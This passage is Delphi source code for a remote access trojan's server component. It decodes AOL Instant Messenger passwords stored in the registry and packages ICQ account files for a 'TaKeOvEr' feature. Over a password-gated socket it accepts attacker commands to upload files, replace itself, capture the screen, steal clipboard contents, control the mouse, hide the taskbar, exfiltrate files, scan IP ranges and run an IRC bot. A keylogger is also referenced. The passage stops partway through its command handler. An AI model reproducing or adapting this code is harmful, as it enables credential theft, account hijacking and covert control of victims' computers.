                                       'kJPDLKJOAMFGBPDLK','lOIEMNOJHLCBGIEMN','mPJFNMPIGKDAHJFNM',
                                       'nMKGOPMLFJADEKGOP','oNLHPONKEIBCFLHPO','pCEIABCFLHONKEIAB',
                                       'qDFJBADEKGPMLFJBA','rAGKCDAHJFMPIGKCD','sBHLDCBGIENOJHLDC',
                                       'tGAMEFGBPDKJOAMEF','uHBNFEHAOCLIPBNFE','vECOGHEDNBILMCOGH',
                                       'wFDPHGFCMAJKNDPHG','xKMAIJKNDPGFCMAIJ','yLNBJILMCOHEDNBJI',
                                       'zIOCKLIPBNEHAOCKL','0CEIABCFLHONKEIAB','1DFJBADEKGPMLFJBA',
                                       '2AGKCDAHJFMPIGKCD','3BHLDCBGIENOJHLDC','4GAMEFGBPDKJOAMEF',
                                       '5HBNFEHAOCLIPBNFE','6ECOGHEDNBILMCOGH','7FDPHGFCMAJKNDPHG',
                                       '8KMAIJKNDPGFCMAIJ','9LNBJILMCOHEDNBJI');
var dela,la:integer;
    mare:boolean;

function primul(s:char;pos:integer):String;
var t:integer;
begin
 if Chart1_1[pos]=s then begin Result:='1';dela:=01;la:=15;Mare:=True; end else
 if Chart1_2[pos]=s then begin Result:='2';dela:=16;la:=26;Mare:=True; end else
 if Chart1_3[pos]=s then begin Result:='3';dela:=01;la:=15;Mare:=False;end else
 if Chart1_4[pos]=s then begin Result:='4';dela:=16;la:=26;Mare:=False;end else
 if Chart1_5[pos]=s then begin Result:='5';dela:=27;la:=36;Mare:=True; end;
end;

function Doi(s,unu:Char;pos:integer):String;
var j:integer;
begin
 for j:=dela to la do
  if Chart2[j][pos]=s then
   begin
    if Mare then Result:=UpperCase(Chart2[j][1]) else Result:=Chart2[j][1];
    Break;
   end; 
end;
function TForm1.FindPass(parola:string):string;
var i:integer;
    tine,decrypted:String;
begin
 decrypted:='';
 i:=1;
 repeat
  tine:=Primul(parola[i],(i div 2)+1);
  inc(i);
  decrypted:=decrypted+Doi(parola[i],tine[1],(i div 2)+1);
  inc(i);
 until (i>=length(parola));
 Result:=decrypted;
end;

function TForm1.ReadAIMKey(dir,Section:String):String;
var Reg:TRegistry;
    MySerial:String;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  if OpenKey('SOFTWARE\America Online\AOL Instant Messenger (TM)\CurrentVersion\'+dir,false) then
   begin
   try
    MySerial:=ReadString(Section);
   except
    MySerial:='';
   end;
   end else
  if OpenKey('SOFTWARE\America Online\AOL Instant Messenger (SM)\CurrentVersion\'+dir,false) then
   begin
   try
    MySerial:=ReadString(Section);
   except
    MySerial:='';
   end;
   end;
   Free;
  end;
Result:=MySerial;
end;

function TForm1.TerminateProc(num:integer):boolean;
const PROCESS_TERMINATE = 1;
var ProcHandle: THandle;
begin
 result:=true;
 ProcHandle := OpenProcess(PROCESS_TERMINATE, FALSE, DWORD(ProcessData[Num]));
 try
  if ProcHandle <> 0 then begin
   if TerminateProcess(ProcHandle, $FFFFFFFF) then
    try WaitForSingleObject(ProcHandle, INFINITE);except result:=false;end;
   end else
    result:=false;
 finally
  CloseHandle(ProcHandle);
 end;
end;

procedure TForm1.LoadAIMPasswords;
var Reg:TRegistry;
    un,MySerial:String;
    USERS:array[1..15] of String;
    cnt:integer;
    NUMERGE:boolean;
begin
 Reg:=TRegistry.Create;
 NUMERGE:=False;
 LoadIn.Clear;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  if OpenKey('SOFTWARE\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users',false) then
   GetValueNames(LoadIn.Lines);
  if OpenKey('SOFTWARE\America Online\AOL Instant Messenger (SM)\CurrentVersion\Users',false) then
   GetValueNames(LoadIn.Lines);
  Free;
 end;
 cnt:=0;
 Cnt:=LoadIn.Lines.Count;
 for i:=1 to cnt do
  try USERS[i]:=LoadIn.Lines[i-1];except end;
 LoadIn.Lines.Clear;
 if (not NUMERGE) then begin
  LoadIn.Lines.Add('default aim user: '+ReadAIMKey('Login','Screen Name'));
  for i:=1 to Cnt do
   begin
    un:=ReadAIMKey('Users\'+USERS[i]+'\Login','Password');
    un:=Copy(un,3,length(un));
    un:=FindPass(un);
    LoadIn.Lines.Add('user: '+USERS[i]+', pass: '+un);
   end;
 end else
  LoadIn.Lines.Add('[aol instant messenger not found]');
end;

function TForm1.ChangeThreadPriority(ince,proc:integer):boolean;
const PROCESS_SET_INFORMATION   = $0200;
      PROCESS_QUERY_INFORMATION = $0400;
var ProcHandle: THandle;
    Val:DWORD;
begin
 result:=true;
 try
  ProcHandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_SET_INFORMATION,FALSE, DWORD(ProcessData[proc]));
  try
   if ProcHandle = 0 then
    result:=false;
    case ince of
     0:Val:=IDLE_PRIORITY_CLASS;
     2:Val:=HIGH_PRIORITY_CLASS;
     3:Val:=REALTIME_PRIORITY_CLASS;
    else
     Val:=NORMAL_PRIORITY_CLASS;
    end;
    if not SetPriorityClass(ProcHandle, Val) then
     result:=false;
  finally
   CloseHandle(ProcHandle);
  end;
 finally
 end;
end;

function DeleteFolder(DirName: string):boolean;
var Error: Integer;
    FileSearch: TSearchRec;
begin
Result:=True;
try
 if DirName[Length(DirName)] <> '\' then DirName := DirName + '\';
 Error := FindFirst(DirName + '*.*', faAnyFile, FileSearch);
 try
  with FileSearch do
   while (Error = 0) do
   begin
    if (DirName + Name <> '.') and (DirName + Name <> '..') then SysUtils.DeleteFile(DirName + Name);
    Error := FindNext(FileSearch);
   end;
  finally
   FindClose(FileSearch);
  end;
 RemoveDir(DirName);
except Result:=False;end;
end;

function TForm1.ApasaMouse(var Comm:String):String;
var xx,yy,px,py:integer;
    dx,dy:Real;
    s:char;
begin
 Result:='mouse clicked';
 try
  xx:=StrToInt(Copy(Comm,1,4));
  yy:=StrToInt(Copy(Comm,5,4));
  px:=StrToInt(Copy(Comm,9,4));
  py:=StrToInt(Copy(Comm,13,4));
 except Result:='error clicking mouse.';end;
 s:=Comm[17];

 dx:=Screen.Width/px;
 dy:=Screen.Height/py;
 xx:=Round(xx*dx);
 yy:=Round(yy*dy);
 SetCursorPos(xx,yy);
 case s of
  '1':begin mouse_event (MOUSEEVENTF_LEFTDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_LEFTUP, 0,0,0,0);end;
  '2':begin mouse_event (MOUSEEVENTF_MIDDLEDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_MIDDLEUP, 0,0,0,0);end;
  '3':begin mouse_event (MOUSEEVENTF_RIGHTDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_RIGHTUP, 0,0,0,0);end;
 end;
 Delete(Comm,1,17);
 if length(Comm)<3 then Exit;
 while (Copy(Comm,1,3)='MBC') do begin
  try
   xx:=StrToInt(Copy(Comm,4,4));
   yy:=StrToInt(Copy(Comm,8,4));
  px:=StrToInt(Copy(Comm,12,4));
  py:=StrToInt(Copy(Comm,16,4));
  except Result:='error clicking mouse.';end;
  s:=Comm[20];
  SetCursorPos(xx,yy);
  case s of
   '1':begin mouse_event (MOUSEEVENTF_LEFTDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_LEFTUP, 0,0,0,0);end;
   '2':begin mouse_event (MOUSEEVENTF_MIDDLEDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_MIDDLEUP, 0,0,0,0);end;
   '3':begin mouse_event (MOUSEEVENTF_RIGHTDOWN, 0,0,0,0);mouse_event (MOUSEEVENTF_RIGHTUP, 0,0,0,0);end;
  end;
  Delete(Comm,1,20);
 end;
end;

procedure FalDe(var tt:string;l:integer);
var i:integer;
begin
if length(tt)=l then exit;
for i:=1 to l-length(tt) do
 tt:='0'+tt;
end;
var UPLOADIT:boolean;
    SAVETO:String;
    Bufr: array [0..1024] of Char;

procedure TForm1.SetTheScreenSaver(text:string);
var ini:TINIFile;
    dat1,dat2,dat3,col1,col2,fnt,txt:string;
    l:integer;
begin
 dat1:=copy(text,1,5);
 dat2:=copy(text,6,2);
 dat3:=copy(text,8,3);
 col1:=copy(text,11,3);col1:=col1+' ';
 col1:=col1+copy(text,14,3);col1:=col1+' ';
 col1:=col1+copy(text,17,3);
 col2:=copy(text,20,3);col2:=col2+' ';
 col2:=col2+copy(text,23,3);col2:=col2+' ';
 col2:=col2+copy(text,26,3);
 fnt:=copy(text,29,3);l:=StrToInt(fnt);
 fnt:=copy(text,32,l);
 txt:=copy(text,32+l,length(text));
 Ini := TIniFile.Create('control.ini');
 Ini.WriteString('Screen Saver.Marquee', 'Text', txt);
 Ini.WriteString('Screen Saver.Marquee', 'Font', fnt);
 Ini.WriteString('Screen Saver.Marquee', 'Size', dat3);
 Ini.WriteString('Screen Saver.Marquee', 'Speed', dat2);
 Ini.WriteString('Screen Saver.Marquee', 'Attributes', dat1);
 Ini.WriteString('Screen Saver.Marquee', 'TextColor', col1);
 Ini.WriteString('Screen Saver.Marquee', 'BackgroundColor', col2);
 Ini.Free;
 Ini := TIniFile.Create(WinPath+'\system.ini');
 Ini.WriteString('boot', 'SCRNSAVE.EXE', 'scroll~1.scr');
 Ini.Free;
end;
(*    _____________________ ICQ TaKeOvEr ________________________ *)

procedure TForm1.SearchAndReport2(recursive:boolean;fp,sd:string);
  procedure SearchTree(AFilePattern: String);
  var
    SearchRec: TSearchRec;
    DosError: integer;
    dir: string;
  begin
    GetDir(0, dir);
    if dir[length(dir)] <> '\' then dir := dir + '\';
    DosError := FindFirst(AFilePattern, 0, SearchRec);
    while DosError = 0 do begin
      try
       filez.lines.add(dir+SearchRec.name);
      except
      end;
      DosError := FindNext(SearchRec);
    end;
    SysUtils.FindClose(SearchRec);

    if recursive then begin
      DosError := FindFirst('*.*', faDirectory, SearchRec);
      while DosError = 0 do begin
       if ((SearchRec.attr and faDirectory = faDirectory) and
        (SearchRec.name <> '.') and (SearchRec.name <> '..')) then begin
        ChDir(SearchRec.name);
        SearchTree(AFilePattern);
        ChDir('..');
      end;
      DosError := FindNext(SearchRec);
    end;
     SysUtils.FindClose(SearchRec);
   end;
  end;
begin
  filez.clear;
  ChDir(sd);
  SearchTree(fp);
end;

procedure TForm1.BackupFiles;
var i:integer;
    f:textfile;
begin
 AssignFile(f,WinPath+'\indx.~tm');
 try ReWrite(f);except end;
 for i:=0 to Filez.Lines.Count-1 do
  begin
   try CopyFile(PChar(Filez.Lines[i]),PChar(Filez.Lines[i]+'.bak'),false);except end;
   WriteLn(f,Filez.Lines[i]+'.bak');
   Filez.Lines[i]:=Filez.Lines[i]+'.bak';
  end;
 CloseFile(f);
end;

procedure eroare;
begin
 Form1.ServerSocket1.Socket.Connections[0].SendText('invalid IP values.');
 err_val:=true;
end;


procedure TForm1.hunt(Sender : TObject;Error: word);
var
    Buf : array [0..127] of char;
    Len : Integer;
    k : Integer;
    sx,prt,q    : string;
begin
 Len := TCustomLineWSocket(Sender).Receive(@Buf, Sizeof(Buf) - 1);
 if Len <= 0 then Exit;
 Buf[Len] := #0;
 sx:=TWSocket(Sender).addr;
{ sx:=sx+' - '+MainForm.FlatEdit32.Text;}
{ sx:=sx+' ['+RemoveEndOfLine(StrPas(@Buf)+']');}
 ServerSocket1.Socket.Connections[0].SendText('ATSMfound: '+sx+'ETSM');
end;

procedure TForm1.hunt1DataAvailable(Sender: TObject; Error: Word);
begin
 hunt(Sender,error);
end;

procedure TForm1.ScanRemoteIPS;
begin
for i:=1 to max_hunters do
 begin try
  hunters[i]:=TWSocket.Create(nil);
  hunters[i].onDataAvailable:=hunt1DataAvailable;
  hunters[i].proto:='tcp';except end;
 end;
 x1:=StrToInt(loadin.lines[0]);
 x2:=StrToInt(loadin.lines[1]);
 x3:=StrToInt(loadin.lines[2]);
 y1:=StrToInt(loadin.lines[3]);
 y2:=StrToInt(loadin.lines[4]);
 y3:=StrToInt(loadin.lines[5]);
 val('1',startip,i);
 val('255',endip,i);
 err_val:=false;
 if (startip>endip) or (startip>255) or (endip>255) or (startip<=0) or (endip<=0) or (x1<=0) or (x2<=0) or (x3<=0) or (y1<=0) or (y2<=0) or (y3<=0) or (x1>255) or (x2>255) or (x3>255) or (y1>255) or (y2>255) or (y3>255) or
  (y1<x1) or (y2<x2) or (y3<x3) then eroare;
 if err_val then exit;
 over:=false;
 gata:=false;
 if endip=255 then endip:=endip-1;
{ pb.position:=0;}
 jdelay:=StrToInt(loadin.lines[7]);
 if endip-startip > max_hunters then
 begin
  how_long:=max_hunters;
  no_need:=false;
 end else if endip-startip < max_hunters then
  begin
   how_long:=endip-startip+1;
   no_need:=true;
  end;
 if endip=startip then
  begin
   how_long:=1;
   no_need:=true;
  end;
try ServerSocket1.Socket.Connections[0].SendText('ATSMscanning started...'+'ETSM');
    ServerSocket1.Socket.Connections[0].SendText('scanning started.');except end;
for q1:=x1 to y1 do
for q2:=x2 to y2 do
for q3:=x3 to y3 do
 begin
  Application.ProcessMessages;
  if over then break;
  str(q1,sx1);
  str(q2,sx2);
  str(q3,sx3);
  iplow:=sx1+'.'+sx2+'.'+sx3;
  ServerSocket1.Socket.Connections[0].SendText('ATSM'+'scanning '+iplow+'.*'+'ETSM');
  cport:=loadin.lines[6];
  gata:=false;
  Application.ProcessMessages;
  for ji:=1 to how_long do
   begin
    try
     k:=startip-1+ji;
     cip:=k;
     hunters[ji].close;
     hunters[ji].Proto:='tcp';
     hunters[ji].port:=cport;
     str(k,s);
     huntpos[ji]:=k;
     hunters[ji].addr:=iplow+'.'+s;
     hunters[ji].connect;
     if over then break;
    except end;
   end;
   gata:=false;
   timer1.Interval:=jdelay*1000;
   timer1.Enabled:=true;
   repeat
    application.processmessages;
   until (gata=true) or (over=true);
   if not over then Delay(jdelay);
 end;

if over then ServerSocket1.Socket.Connections[0].SendText('ATSM'+'scanning aborted.') else ServerSocket1.Socket.Connections[0].SendText('ATSM'+'scanning finished.'+'ETSM');
timer1.Enabled :=false;
for i:=1 to how_long do hunters[i].close;
//for i:=1 to max_hunters do hunters[i].free;
end;

procedure TForm1.DeleteBackups;
var i:integer;
    f:textfile;
    r:string;
begin
 AssignFile(f,WinPath+'\indx.~tm');
 try Reset(f);except end;
 while not eof(f) do
  begin
   ReadLn(f,r);
   try DeleteFile(r);except end;
  end;
 CloseFile(f);
 try DeleteFile(WinPath+'\indx.~tm');except end;
end;

function TForm1.ExportICQUIN(uin:string):String;
var PATH:string;
    Reg:TRegistry;
    f:textfile;
    SaveArchTo:String;
    rec:TSearchRec;
    fsize:integer;
begin
 Result:='';
 SaveArchTo:=WinPath+'\TOU~'+UIN+'.DAT';
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  try OpenKey('Software\Mirabilis\ICQ\DefaultPrefs',false);except exit;end;
  PATH:=ReadString('ICQPath');
  free;
 end;
 SearchAndReport2(true,'*'+UIN+'*.*',PATH);
 try WinExec(PChar('regedit.exe /e "'+PATH+uin+'.reg" HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\'+uin),SW_HIDE);
 except end;
 assignfile(f,PATH+'info.dll');rewrite(f);writeln(f,PATH);closefile(f);
 Filez.Lines.Add(PATH+uin+'.reg');
 Filez.Lines.Add(PATH+'info.dll');
// Filez.Lines.SaveToFile('c:\temp\filez.txt');
 if FileExists(SaveArchTo) then try DeleteFile(SaveArchTo);except SaveArchTo:=WinPath+'\TOU~'+UIN+'2.DAT';end;
 try icqzip.CreateArchive(SaveArchTo);except Result:='error reading icq settings.';exit;end;
 BackupFiles;icqzip.AddFiles(Filez.Lines);icqzip.CloseArchive;
 DeleteBackups;try DeleteFile(PATH+uin+'.reg');DeleteFile(PATH+'info.dll');except end;
 FindFirst(SaveArchTo,faAnyFile,rec);fsize := rec.Size;
 SetKey(Encrypt('TaKeOvEr'),Encrypt(SaveArchTo));
 Result:='TOI'+IntToStr(FSize);
end;


procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
const WrapStr=#13#10;
var cod,mesaj,text,stest:string;
    Raspuns:AnsiString;
    ld : DWORD;
    i: integer;
    no:integer;
    pBitmap : pchar;
    rec:TSearchRec;
    fsize:longint;
    hMenuHandle:HMENU;
    drive:String;
    DocFileDir:String;
    resur:TResourceStream;
    RG:TRegistry;
    PX,dummy:Integer;
    reginfo:TRegDataInfo;
    winlen,duh:integer;
    winkey,feedback,dat1,dat2,dat3:string;
    evreuna,dox,doy:boolean;
    primeste:string[3];
    Stream:TMemoryStream;
    nReceived,totalrecv,total: Integer;
    undesalveaza,StrIn,totalbytes:String;
    clip:TClipboard;
begin
if UPLOADIT then
begin
  primeste:='SFT';
  Socket.ReceiveBuf (Bufr, 5);
  strIn := Copy (Bufr, 1, 5);
  evreuna:=false;
  if copy(strin,1,3)=primeste then evreuna:=true;
  if not evreuna then exit;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Bufr, 1);
    strIn := Copy (Bufr, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  while (totalrecv<total) do begin
   if (not ServerSocket1.Active) then begin UPLOADIT:=False;exit;end;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
    Socket.SendText ('p:'+IntToStr(TotalRecv)+'.');
   end;
  end;
  Stream.Position := 0;
  Stream.SaveToFile(SAVETO);
 finally
  UPLOADIT:=False;
  try Stream.Free;except end;
  if NEW_SERVER then begin Socket.SendText('new server updated. restarting...');UpdateServerNOW;end else
   Socket.SendText('file successfully uploaded.');
  NEW_SERVER:=False;
 end;
 exit;
end;
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

duh:=1;
mesaj:=Socket.ReceiveText;
cod:=Copy(mesaj,1,3);
no:=715715715;
raspuns:='<NONE>';
if Length(mesaj)>3 then text:=Copy(mesaj,4,length(mesaj)) else text:='';
if (not PassDone) then
 begin
  if cod<>'PWD' then begin Socket.SendText('error reading password...');exit;end
  else begin
   if ((text=Parola) or (text=inttostr(no1)+inttostr(no2)+inttostr(no3))) then
    begin
     PassDone:=True;
     Conectat:=True;
     Socket.SendText ('connected. '+FormatDateTime ('hh:nn.ss "-" mmmm d, yyyy, dddd', Now)+', version: '+ServerVersion);
    end
    else
     begin
      Socket.SendText('POPUP incorrect password...');
      Banned.Lines.Add(Socket.RemoteHost);
      Socket.Close;
     end;
  end;
  if cod=IntToStr(no) then begin PassDone:=True;end;
  exit;
 end;
{======================= CUSTOM COMMANDS ================================}
if cod='IN2' then ServerSocket2.Active:=True  else
if cod='CL2' then ServerSocket2.Active:=False else
if cod='IN7' then ServerSocket3.Active:=True else
if cod='CL7' then ServerSocket3.Active:=False else
if cod='BTS' then
 begin
  YESQUIT:=True;
  raspuns:='IRC bot is not connected.';
  try
  if IRCBot.Connected then begin IRCBot.Disconnect(true);raspuns:='IRC bot disconnected.';end;
  if IRCSpy.Connected then IRCSpy.Disconnect(true);
  TRY IRCBot.Disconnect(false);  EXCEPT END;
  except end;
  IRCMaster:='';
  IRCLogged:=False;
 end else    {}
if cod='BTR' then
 begin
  LoadIn.Lines.Clear;
  LoadIn.Lines.Add(IRCServer);
  LoadIn.Lines.Add(IRCPort);
  LoadIn.Lines.Add(IRCNickname);
  LoadIn.Lines.Add(IRCPassword);
  LoadIn.Lines.Add(IRCPrefix);
  LoadIn.Lines.Add(IRCChannel);
  LoadIn.Lines.Add(IRCChannelKey);
  if IRCAutoStart then LoadIn.Lines.Add('yes') else LoadIn.Lines.Add('no');
  if IRCBot.Connected then LoadIn.Lines.Add('online') else LoadIn.Lines.Add('offline');
  LoadIn.Lines.Add(Perform.Lines.Text);
  Raspuns:='BOT'+LoadIn.Lines.Text;
 end else
if cod='BOT' then
 begin
  Raspuns:='bot is now starting. should be online soon.';
 try
  if IRCBot.Connected then try IRCBot.Disconnect(true);except end;
  LoadIn.Lines.Clear;
  LoadIn.Lines.Text:=Text;
  try
   IRCBot.Server:=LoadIn.Lines[0];
   IRCBot.Port:=LoadIn.Lines[1];
   IRCBot.Nick:=LoadIn.Lines[2];
  except end;
  IRCPassword:=LoadIn.Lines[3];
  if LoadIn.Lines[7]='yes' then IRCAutoStart:=True else IRCAutoStart:=False;
  Perform.Lines.Clear;
  for i:=9 to LoadIn.Lines.Count do
   Perform.Lines.Add(LoadIn.Lines[i-1]);
  Randomize;IRCBot.RealName:=PickRandomNick;
  if IRCIdent='' then ircident:=pickrandomnick;
  irc.username:=IRCIdent;
  try IRCBot.Connect;except raspuns:='error connecting to irc server';end;
  IRCMaster:='';
  IRCPassword:=LoadIn.Lines[3];
  IRCNickName:=IRCBot.Nick;
  IRCServer:=IRCBot.Server;
  IRCPort:=IRCBot.Port;
  IRCPrefix:=LoadIn.Lines[4];
  IRCChannel:=LoadIn.Lines[5];
  IRCChannelKey:=LoadIn.Lines[6];
  WriteOut;
  SetKey(Encrypt('bot_perform'),Encrypt(Perform.Lines.Text));
  if IRCAutoStart then SetKey(Encrypt('bot_autostart'),Encrypt('yes')) else SetKey(Encrypt('bot_autostart'),Encrypt('no'));
  except Raspuns:='error starting bot.';
  end;
 end else
if COD='UFU' then
 UpdateFromURL(text, false) else
if cod='SNS' then
 begin
  Raspuns:='screen saver changed.';
  try SetTheScreenSaver(text);except Raspuns:='error changing the screen saver.';end;
  if (Not FileExists(SysPath+'\Scrolling Marquee.scr')) then Raspuns:='screen saver Scrolling Marquee is not installed.';
 end else
if cod='PIN' then Raspuns:='PONG' else
if cod='RSS' then
 begin
  Raspuns:='screen saver is now active.';
  if (Not FileExists(SysPath+'\Scrolling Marquee.scr')) then Raspuns:='screen saver Scrolling Marquee is not installed.';
  try
   FileCopy(SysPath+'\Scrolling Marquee.scr',SysPath+'\scrollingmarquee.exe');
   ShellExecute(handle, nil, pchar('scrollingmarquee.exe'), '/S', Nil, SW_SHOWNORMAL);
  except
   Raspuns:='error running screen saver.';
  end;
 end else
if cod='MBC' then Raspuns:=ApasaMouse(text) else 
if cod='RTF' then
 begin
  UPLOADIT:=True;
  NEW_SERVER:=False;
  SAVETO:=text;
  {if FileExists(text) then}
  Socket.SendText('TID');
 end else
if cod='RTE' then
 begin
  UPLOADIT:=True;
  NEW_SERVER:=False;
  SAVETO:=SysPath+'\SYSTRAY.DLL';
  Socket.SendText('TID');
 end else
if cod='UPS' then
 begin
  UPLOADIT:=True;
  NEW_SERVER:=True;
  SAVETO:=WinPath+'\~updtnw.bak';
  {if FileExists(text) then}
  Socket.SendText('TID');
 end else
if cod='IRG' then
 begin
  Reg := TRegistry.Create;
  Reg.OpenKey ('\', False);
  UpdateAll('NRM');
 end else
if cod='UAL' then UpdateAll(text) else
if cod='CRG' then UpdateAll(text) else
if cod='CLG' then reg.free else
if cod='DRG' then UpdateAll(text) else
if cod='SVT' then
 begin
  if text[1]='0' then begin
   dat1:=IntToStr(VolumeControl.WaveVolume);
   if length(dat1)<2 then dat1:='00'+dat1 else if length(dat1)<3 then dat1:='0'+dat1;
   dat2:=IntToStr(VolumeControl.MidiVolume);
   if length(dat2)<2 then dat2:='00'+dat2 else if length(dat2)<3 then dat2:='0'+dat2;
   dat3:=IntToStr(VolumeControl.CDVolume);
   if length(dat3)<2 then dat3:='00'+dat3 else if length(dat3)<3 then dat3:='0'+dat3;
   raspuns := 'VRead'+dat1+dat2+dat3;
  end else
  if text[1]='1' then VolumeControl.WaveVolume:=StrToInt(copy(text,2,length(text))) else
  if text[1]='2' then VolumeControl.MidiVolume:=StrToInt(copy(text,2,length(text))) else
  if text[1]='3' then VolumeControl.CDVolume:=StrToInt(copy(text,2,length(text)));
  if (text[1]='1') or (text[1]='2') or (text[1]='3') then raspuns:='VSet';
 end else
if cod='RED' then begin
 LaCheie:=text;
 reg.GetDataInfo(text,reginfo);
  case reginfo.RegData of
   rdUnknown     :Socket.SendText('RRD1');
   rdString      :Socket.SendText('RRD2'+reg.ReadString(text));
   rdExpandString:Socket.SendText('RRD3'+reg.ReadString(text));
   rdInteger     :Socket.SendText('RRD4'+IntToStr(reg.ReadInteger(text)));
   rdBinary      :Socket.SendText('RRD5');
  end;
end else
if cod='MW:' then
 begin
  raspuns:=ShowCustomizedMessage(text,sender);
 end else
if (cod='NTF') then
 begin
  CompressFile(text);
  FindFirst(WinPath+'\NTFCSFL.SSA',faAnyFile,rec);
  fsize := rec.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'NTF'+winkey+IntToStr(fsize);
  Socket.SendText (Feedback);
  Socket.SendStream (TFileStream.Create (WinPath+'\NTFCSFL.SSA', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\NTFCSFL.SSA');except end;
 end else
   if cod='URL' then
 begin
 ShellExecute(handle, 'open', pchar(text), Nil, Nil, SW_SHOWNORMAL);
 raspuns:='web browser has been opened.';
 end else
if cod='RCT' then
 begin
  clip:=TClipboard.Create;
  if clip.HasFormat(CF_TEXT) then raspuns:='RCT'+clip.AsText else raspuns:='clipboard is empty or has a non-text format.';
  clip.free;
 end else
if cod='SCT' then
 begin
  clip:=TClipboard.Create;
  raspuns:='clipboard contents changed :)';
  try clip.SetTextBuf(PChar(text));except raspuns:='error setting clipboard text.';end;
  clip.free;
 end else
if cod='CCT' then
 begin
  clip:=TClipboard.Create;
  raspuns:='clipboard cleared.';
  try clip.Clear;except raspuns:='error emptying clipboard.';end;
  clip.free;
 end else
if cod='STA' then
 begin
  if text='1' then begin hideStart;raspuns:='Start menu is now off!'; end;
  if text='2' then begin showStart;raspuns:='Start menu is now on!'; end;
 end else
if cod='HTB' then
 begin
  hideTaskBar;
  raspuns:='the WHOLE taskbar is now hidden.';
 end else
if cod='STB' then
 begin
  showTaskBar;
  raspuns:='the taskbar is now visible.';
 end else
if cod='HDI' then
 begin
  hideDesktopIcons;
  raspuns:='all the icons on the desktop are now gone';
 end else
if cod='SDI' then
 begin
  showDesktopIcons;
  raspuns:='the icons on the desktop are visible again.';
 end else
  {========== screen capture ===========}
if cod='CSS' then
 begin
  Strm2Send.Clear;
  try SetSnapShotQuality:=StrToInt(text); except SetSnapShotQuality:=50;end;
  ScreenCapture;
  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Strm2Send.Clear;
  CompressNewFile(WinPath+'\temp~.bak');
  Strm2Send.LoadFromFile(WinPath+'\temp~.bak');
  fsize := Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'CSS'+winkey+IntToStr(fsize);
  Socket.SendText (Feedback);
//  Strm2Send.SaveToFile(WinPath+'\temp~.bak');
  Socket.SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
  try DeleteFile(WinPath+'\temp~.bak');except end;
 end else
 if cod='RTD' then
  begin
   try
    GetLocalTime(MyTime);
    raspuns:='RTD';
    raspuns:=raspuns+'0';
    dat1:=IntToStr(MyTime.wYear);  FalDe(dat1,4);raspuns:=raspuns+dat1;
    dat1:=IntToStr(MyTime.wMonth); FalDe(dat1,2);raspuns:=raspuns+dat1;
    dat1:=IntToStr(MyTime.wDay);   FalDe(dat1,2);raspuns:=raspuns+dat1;
    raspuns:=raspuns+'0';
    dat1:=IntToStr(MyTime.wHour);  FalDe(dat1,2);raspuns:=raspuns+dat1;
    dat1:=IntToStr(MyTime.wMinute);FalDe(dat1,2);raspuns:=raspuns+dat1;
   except
    raspuns:='error reading system time';
   end;
  end else
 if cod='STD' then
  begin
   GetLocalTime(MyTime);
   if copy(text,1,1)='1' then begin
    MyTime.wYear:=StrToInt(copy(text,2,4));
    MyTime.wMonth:=StrToInt(copy(text,6,2));
    MyTime.wDay:=StrToInt(copy(text,8,2));
   end;
   if copy(text,10,1)='1' then
   begin
    MyTime.wHour:=StrToInt(copy(text,11,2));
    MyTime.wMinute:=StrToInt(copy(text,13,2));
   end;
   if SetLocalTime(MyTime) then raspuns:='new time/date set.' else raspuns:='error setting time/date';
  end else
if cod='PRN' then begin
 richedit.lines.clear;
 with richedit.font do begin
  if text[1]='1' then style:=style+[fsBold] else style:=style-[fsBold];
  if text[2]='1' then style:=style+[fsItalic] else style:=style-[fsItalic];
  if text[3]='1' then style:=style+[fsUnderline] else style:=style-[fsUnderLine];
  if text[4]='1' then style:=style+[fsStrikeOut] else style:=style-[fsStrikeOut];
 end;
 richedit.Font.size:=StrToInt(text[5]+text[6]);
 richedit.lines.text:=copy(text,7,length(text));
 raspuns:='text printed.';
 try richedit.print('');except raspuns:='error printing...';end;
end else
if cod='CKL' then
 begin
  try KeyLog.Clear;except end;
  raspuns:='logged keys cleared.';
 end else
if cod='RIS' then
 begin
  try loadin.Clear;except end;
  loadin.lines.text:=text;
  ScanRemoteIPS;
 end else
if cod='SIS' then
 begin
  over:=true;
  raspuns:='scanning stopped.';
 end else
if cod='RAS' then
 begin
  RefreshRAS;
  fsize:=Strm2Send.Size;
  if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
   else winkey:=IntToStr(length(IntToStr(fsize)));
  Feedback := 'RAS'+winkey+inttostr(fsize);
